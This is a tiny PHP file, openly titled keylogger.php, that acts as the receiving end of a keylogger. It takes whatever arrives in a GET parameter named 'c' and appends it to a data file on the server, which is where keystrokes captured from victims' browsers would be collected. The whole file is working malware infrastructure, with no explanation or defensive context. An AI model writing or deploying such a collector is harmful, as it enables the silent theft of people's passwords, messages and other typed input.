<?php
// keylogger.php

if(!empty($_GET['c'])) {
    $logfile = fopen('../php/data.txt', 'a+');
    fwrite($logfile, $_GET['c']);
    fclose($logfile);
}
?>
